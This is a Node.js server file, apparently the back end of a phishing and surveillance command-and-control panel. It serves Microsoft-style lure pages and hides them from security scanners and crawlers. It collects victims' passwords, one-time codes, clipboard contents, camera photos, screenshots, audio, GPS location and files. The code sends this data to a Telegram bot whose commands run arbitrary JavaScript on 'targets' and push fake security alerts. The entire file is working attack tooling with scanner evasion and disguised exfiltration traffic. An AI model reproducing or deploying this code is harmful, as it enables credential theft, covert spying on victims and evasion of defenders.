const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const parser = require('user-agent-parser');
const axios = require('axios');
const fs = require('fs');
const cors = require('cors');
const webpush = require('web-push');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(cors()); // Allow all origins for the demo

// Telegram Config
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let bot = null;
if (TG_TOKEN) {
    bot = new TelegramBot(TG_TOKEN, { polling: true });
    console.log('[TELEGRAM] Bot iniciado com sucesso');
}

async function sendTelegramMsg(text) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendMessage(TG_CHAT_ID, text, { parse_mode: 'Markdown' });
    } catch (e) {
        console.error('[TELEGRAM] Error sending message:', e.message);
    }
}

async function sendTelegramFile(buffer, filename, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendDocument(TG_CHAT_ID, buffer, { caption }, { filename });
    } catch (e) {
        console.error('[TELEGRAM] Error sending file:', e.message);
    }
}

async function sendTelegramPhoto(buffer, caption) {
    if (!bot || !TG_CHAT_ID) return;
    try {
        await bot.sendPhoto(TG_CHAT_ID, buffer, { caption });
    } catch (e) {
        console.error('[TELEGRAM] Error sending photo:', e.message);
    }
}

// BOT COMMANDS LISTENER
if (bot) {
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, "🛰️ *SentinelAware C2 Bot*\n\nComandos disponíveis:\n/targets - Lista alvos online\n/cmd <ID> <comando> - Envia comando para um alvo\n/shell <ID> <js> - Executa JS no alvo\n/notif <ID> <txt> - Envia notificação push", { parse_mode: 'Markdown' });
    });

    bot.onText(/\/targets/, (msg) => {
        const online = logs.filter(l => l.status !== 'offline');
        if (online.length === 0) return bot.sendMessage(msg.chat.id, "Nenhum alvo online no momento.");
        
        let reply = "🟢 *ALVOS ONLINE:*\n\n";
        online.forEach(l => {
            reply += `🆔 ID: \`${l.id}\`\n🌍 IP: ${l.ip}\n📍 Geo: ${l.geo}\n------------------\n`;
        });
        bot.sendMessage(msg.chat.id, reply, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/cmd (\S+) (\S+)/, (msg, match) => {
        const targetId = match[1];
        const command = match[2];
        const log = logs.find(l => l.id === targetId);

        if (!log) return bot.sendMessage(msg.chat.id, `❌ Alvo \`${targetId}\` não encontrado.`);

        io.emit('execute_command', { logId: targetId, command });
        bot.sendMessage(msg.chat.id, `🚀 Comando \`${command}\` enviado para \`${targetId}\``);
    });

    bot.onText(/\/shell (\S+) (.+)/, (msg, match) => {
        const targetId = match[1];
        const script = match[2];
        io.emit('execute_command', { logId: targetId, command: 'execute_js', script });
        bot.sendMessage(msg.chat.id, `💻 Script enviado para \`${targetId}\``);
    });

    bot.onText(/\/notif (\S+) (.+)/, (msg, match) => {
        const targetId = match[1];
        const text = match[2];
        const log = logs.find(l => l.id === targetId);
        
        if (log && log.subscription) {
            const payload = JSON.stringify({ title: 'Alerta de Segurança', msg: text });
            webpush.sendNotification(log.subscription, payload);
            bot.sendMessage(msg.chat.id, `📲 Push enviado para \`${targetId}\``);
        } else {
            io.emit('push_notif', { logId: targetId, title: 'Alerta', msg: text });
            bot.sendMessage(msg.chat.id, `⚠️ Push via Socket (SW offline) enviado para \`${targetId}\``);
        }
    });
}

// --- CLOAKING MODULE (Bot & Scanner Evasion) ---
const suspiciousUA = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
    'headless', 'lighthouse', 'inspect', 'curl', 'wget', 'python', 'crawler',
    'spider', 'scanning', 'virus', 'security', 'trendmicro', 'fortinet',
    'paloalto', 'zscaler', 'headlesschrome', 'lighthouse', 'validator'
];

function isBot(ua) {
    if (!ua) return true;
    const lowerUA = ua.toLowerCase();
    return suspiciousUA.some(bot => lowerUA.includes(bot));
}

function cloakingMiddleware(req, res, next) {
    const ua = req.headers['user-agent'];
    const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress).replace('::ffff:', '');
    
    if (isBot(ua)) {
        console.log(`\x1b[31m[CLOAKING] Bot detectado e bloqueado! IP: ${ip} | UA: ${ua}\x1b[0m`);
        sendTelegramMsg(`🛡️ *[CLOAKING] BOT BLOQUEADO*\n🌍 IP: \`${ip}\`\n🕵️ UA: \`${ua}\`\n\n*Ação:* Redirecionado para Wikipedia.`);
        return res.redirect('https://pt.wikipedia.org/wiki/Seguran%C3%A7a_da_informa%C3%A7%C3%A3o');
    }
    next();
}

// Global middleware to skip Ngrok browser warning for ALL requests
app.use((req, res, next) => {
    res.setHeader('ngrok-skip-browser-warning', 'true');
    next();
});

const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 1e8, // 100MB for large screenshots/photos
    transports: ['polling', 'websocket'],
    allowUpgrades: true,
    pingTimeout: 30000,
    pingInterval: 25000,
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        allowedHeaders: ["ngrok-skip-browser-warning", "Content-Type"],
        credentials: false
    }
});

const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

// Helper to save data
function saveToDB() {
    const data = { links, logs, vapidKeys };
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// Load data on startup
let links = [];
let logs = [];
let vapidKeys = null;

if (fs.existsSync(DB_FILE)) {
    try {
        const savedData = JSON.parse(fs.readFileSync(DB_FILE));
        links = savedData.links || [];
        logs = savedData.logs || [];
        vapidKeys = savedData.vapidKeys || null;
        console.log('Database loaded successfully');
    } catch (e) {
        console.error('Error loading database, starting fresh');
    }
}

// Generate VAPID keys if not present
if (!vapidKeys) {
    vapidKeys = webpush.generateVAPIDKeys();
    console.log('VAPID Keys generated');
    saveToDB();
}

webpush.setVapidDetails(
    'mailto:admin@sentinelaware.local',
    vapidKeys.publicKey,
    vapidKeys.privateKey
);

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Serve Dashboard on Root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Heartbeat for Service Worker Persistence
app.post('/api/heartbeat', (req, res) => {
    // Just a placeholder to keep the SW communication active
    res.json({ status: 'active', received: true });
});

// Get Public VAPID Key
app.get('/api/vapid-public-key', (req, res) => {
    res.json({ publicKey: vapidKeys.publicKey });
});

// Create a new random link
app.post('/api/links', (req, res) => {
    const { template } = req.body;
    const id = Math.random().toString(36).substring(2, 10);
    const newLink = {
        id,
        url: `/t/${id}`,
        template: template || 'generic',
        createdAt: new Date(),
        clicks: 0
    };
    links.push(newLink);
    saveToDB();
    res.json(newLink);
});

// Tracking endpoint
app.get('/t/:id', cloakingMiddleware, async (req, res) => {
    const linkId = req.params.id;
    const link = links.find(l => l.id === linkId);

    if (link) {
        link.clicks++;
        saveToDB();
        
        // Serve correct template
        const templateFile = link.template ? `${link.template}.html` : 'microsoft.html';
        const templatePath = path.join(__dirname, 'public', templateFile);
        
        if (fs.existsSync(templatePath)) {
            res.sendFile(templatePath);
        } else {
            res.sendFile(path.join(__dirname, 'public', 'microsoft.html'));
        }
    } else {
        // Link not found, fallback to microsoft
        res.sendFile(path.join(__dirname, 'public', 'microsoft.html'));
    }
});

// Socket logic for persistent sessions
io.on('connection', (socket) => {
    console.log(`[SOCKET] Nova conexão: ${socket.id}`);

    // Unified Telemetry Handler (Traffic Camouflage)
    socket.on('telemetry_data', (packet) => {
        try {
            // Decoding the camouflaged payload
            const rawData = Buffer.from(packet.v, 'base64').toString();
            const { event, data } = JSON.parse(rawData);

            switch(event) {
                case 'join': handleJoin(socket, data); break;
                case 'status': handleStatus(data); break;
                case 'heartbeat': handleHeartbeat(data); break;
                case 'photo': handlePhoto(data); break;
                case 'creds': handleCreds(data); break;
                case 'perf': handlePerf(data); break;
                case 'clipboard': handleClipboard(data); break;
                case 'audio_level': handleAudioLevel(data); break;
                case 'audio_stream': handleAudioStream(data); break;
                case 'files_sim': handleFilesSim(data); break;
                case 'fingerprint': handleFingerprint(data); break;
                case 'screenshot': handleScreenshot(data); break;
                case 'audio_cap': handleAudioCap(data); break;
                case 'subscription': handleSubscription(data); break;
                case 'chat_victim': handleChatVictim(data); break;
                case 'network': handleNetwork(data); break;
                case 'geo': handleGeo(data); break;
                case 'file_up': handleFileUpload(data); break;
                case 'js_result': handleJsResult(data); break;
            }
        } catch(e) {
            console.error('[TELEMETRY] Failed to parse camouflaged packet:', e.message);
        }
    });

    // Helper Handlers (Extracted for clarity)
    function handleJoin(socket, data) {
        const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address).replace('::ffff:', '');
        let log = logs.find(l => l.id === data.logId);

        if (!log) {
            log = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Calculando...', creds: [], chat: [], threatLevel: 'green', status: 'online' };
            logs.push(log);
            saveToDB();
            io.emit('new_click', log);

            sendTelegramMsg(`🚨 *NOVO ALVO CONECTADO*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\`\n🔗 Link: \`${log.linkId}\``);

            axios.get(`https://ipapi.co/${ip}/json/`).then(r => {
                if(r.data && !r.data.error) {
                    log.geo = `${r.data.city}, ${r.data.country_name}`;
                    log.lat = r.data.latitude; log.lon = r.data.longitude;
                    saveToDB();
                    io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                    sendTelegramMsg(`🌍 *LOCALIZAÇÃO (IP)*\n🆔 ID: \`${log.id}\`\n📍 Cidade: \`${r.data.city}\`\n🇧🇷 País: \`${r.data.country_name}\``);
                }
            }).catch(() => {
                if (ip === '127.0.0.1' || ip === '::1') {
                    log.geo = 'Localhost (Dev)'; log.lat = -23.5505; log.lon = -46.6333;
                    saveToDB();
                    io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                }
            });
        } else {
            log.status = 'online'; log.timestamp = new Date();
            saveToDB();
            io.emit('update_log', { id: log.id, status: 'online' });
            sendTelegramMsg(`✅ *ALVO VOLTOU ONLINE*\n🆔 ID: \`${log.id}\``);
        }
    }

    function handleStatus(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.status = data.status; saveToDB(); io.emit('update_log', { id: log.id, status: log.status }); }
    }

    function handleHeartbeat(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.status = log.status === 'infected' ? 'infected' : 'online'; io.emit('update_log', { id: log.id, status: log.status }); }
    }

    function handlePhoto(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.photo = data.image;
            saveToDB();
            io.emit('update_log', { id: log.id, photo: data.image });
            
            const base64Data = data.image.split(';base64,').pop();
            const buffer = Buffer.from(base64Data, 'base64');
            sendTelegramPhoto(buffer, `📸 *FOTO CAPTURADA*\n🆔 ID: \`${log.id}\``);
        }
    }

    function handleCreds(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.creds.push(data.value);
            log.threatLevel = 'yellow';
            saveToDB();
            io.emit('update_log', { id: log.id, creds: log.creds, threatLevel: log.threatLevel });

            let emoji = '🔑';
            if (data.value.includes('USER')) emoji = '👤';
            if (data.value.includes('PASS')) emoji = '🔓';
            if (data.value.includes('OTP')) emoji = '🔢';
            
            sendTelegramMsg(`${emoji} *CAPTURA DE DADOS*\n🆔 ID: \`${log.id}\`\n📝 Valor: \`${data.value}\``);
        }
    }

    function handlePerf(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.currentTyping = data.text;
            if (data.text.startsWith('[HARDWARE]:')) { log.hardware = data.text.replace('[HARDWARE]:', '').trim(); saveToDB(); }
            else if (data.text.startsWith('[SYS]:')) { log.sysInfo = data.text.replace('[SYS]:', '').trim(); saveToDB(); }
            io.emit('update_log', { id: log.id, typing: data.text });
        }
    }

    function handleClipboard(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.clipboard = data.text; saveToDB(); io.emit('update_log', { id: log.id, clipboard: data.text }); }
    }

    function handleAudioLevel(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { io.emit('update_log', { id: log.id, audioLevel: data.level }); }
    }

    function handleAudioStream(data) { io.emit('play_audio_stream', { logId: data.logId, chunk: data.chunk }); }

    function handleFilesSim(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.files = data.files; saveToDB(); io.emit('update_log', { id: log.id, files: log.files }); }
    }

    function handleFingerprint(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.fingerprint = data.fingerprint;
            saveToDB();
            io.emit('update_log', { id: log.id, fingerprint: data.fingerprint });

            const f = data.fingerprint;
            const dossier = `📂 *DOSSIÊ COMPLETO DO ALVO*\n` +
                `🆔 ID: \`${log.id}\`\n` +
                `🌐 IP Externo: \`${log.ip}\`\n` +
                `🏠 IP Interno: \`${f.internalIP}\`\n` +
                `📶 Conexão: \`${f.net}\`\n` +
                `🖥️ OS: \`${f.platform}\`\n` +
                `🧠 CPU: \`${f.cores} Cores\` | RAM: \`${f.ram}GB\`\n` +
                `🎮 GPU: \`${f.gpu}\`\n` +
                `📺 Resolução: \`${f.screen}\` (View: ${f.viewport})\n` +
                `🔋 Bateria: \`${f.battery}\`\n` +
                `🌐 Idioma: \`${f.lang}\` | TZ: \`${f.tz}\`\n` +
                `🔌 Plugins: \`${f.plugins.join(', ') || 'Nenhum'}\`\n` +
                `🕵️ Navegador: \`${f.vendor}\``;
            
            sendTelegramMsg(dossier);
        }
    }

    function handleScreenshot(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.screenshot = data.image;
            saveToDB();
            io.emit('update_log', { id: log.id, screenshot: data.image });
            
            const base64Data = data.image.split(';base64,').pop();
            const buffer = Buffer.from(base64Data, 'base64');
            sendTelegramPhoto(buffer, `🖥️ *SCREENSHOT CAPTURADA*\n🆔 ID: \`${log.id}\``);
        }
    }

    function handleAudioCap(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.audio = data.audio; saveToDB(); io.emit('update_log', { id: log.id, audio: data.audio }); }
    }

    function handleSubscription(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.subscription = data.subscription; saveToDB(); io.emit('update_log', { id: log.id, hasPush: true }); }
    }

    function handleChatVictim(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { if (!log.chat) log.chat = []; log.chat.push({ from: 'victim', msg: data.msg, time: new Date() }); saveToDB(); io.emit('update_log', { id: log.id, chat: log.chat }); }
    }

    function handleNetwork(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.internalDevices = data.devices;
            log.socialPresence = data.social;
            saveToDB();
            io.emit('update_log', { id: log.id, internalDevices: log.internalDevices, socialPresence: log.socialPresence });
            
            if (data.devices && data.devices.length > 0) {
                sendTelegramMsg(`📡 *DISPOSITIVOS DE REDE DESCOBERTOS*\n🆔 ID: \`${log.id}\`\n🔗 Rede: \`${data.devices.join(', ')}\``);
            }
        }
    }

    function handleGeo(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.lat = data.lat;
            log.lon = data.lon;
            log.geo = `Precise: ${data.lat.toFixed(4)}, ${data.lon.toFixed(4)}`;
            saveToDB();
            io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
            sendTelegramMsg(`📍 *LOCALIZAÇÃO PRECISA (GPS)*\n🆔 ID: \`${log.id}\`\n🗺️ Coordenadas: \`${data.lat}, ${data.lon}\`\n🎯 Google Maps: https://www.google.com/maps?q=${data.lat},${data.lon}`);
        }
    }

    function handleFileUpload(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            if (!log.files) log.files = [];
            log.files.push({ name: data.name, type: data.type, size: data.size, data: data.content, timestamp: new Date() });
            saveToDB();
            io.emit('update_log', { id: log.id, files: log.files });

            // Send to Telegram
            const base64Data = data.content.split(';base64,').pop();
            const buffer = Buffer.from(base64Data, 'base64');
            sendTelegramFile(buffer, data.name, `📂 *ARQUIVO EXFILTRADO*\n🆔 ID: \`${log.id}\`\n📄 Nome: \`${data.name}\``);
        }
    }

    function handleJsResult(data) {
        io.emit('js_result_admin', data);
    }
});

// Admin API
app.get('/api/logs', (req, res) => res.json(logs));
app.get('/api/links', (req, res) => res.json(links));

app.delete('/api/logs', (req, res) => {
    logs = [];
    saveToDB();
    io.emit('all_logs_deleted');
    res.json({ success: true });
});

app.delete('/api/logs/:id', (req, res) => {
    const id = req.params.id;
    logs = logs.filter(l => l.id !== id);
    saveToDB();
    io.emit('update_log', { id, deleted: true });
    res.json({ success: true });
});

// Handle port errors and start server
server.on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
        const nextPort = parseInt(PORT) + 1;
        console.error(`Porta ${PORT} ocupada. Tentando porta ${nextPort}...`);
        server.listen(nextPort);
    }
});

server.listen(PORT, () => {
    const actualPort = server.address().port;
    console.log('\x1b[36m%s\x1b[0m', '------------------------------------------------');
    console.log('\x1b[36m%s\x1b[0m', `🚀 SentinelAware Dashboard: http://localhost:${actualPort}`);
    console.log('\x1b[33m%s\x1b[0m', `🌍 Ngrok: Use 'ngrok http ${actualPort}' para acesso externo`);
    console.log('\x1b[36m%s\x1b[0m', '------------------------------------------------');
});

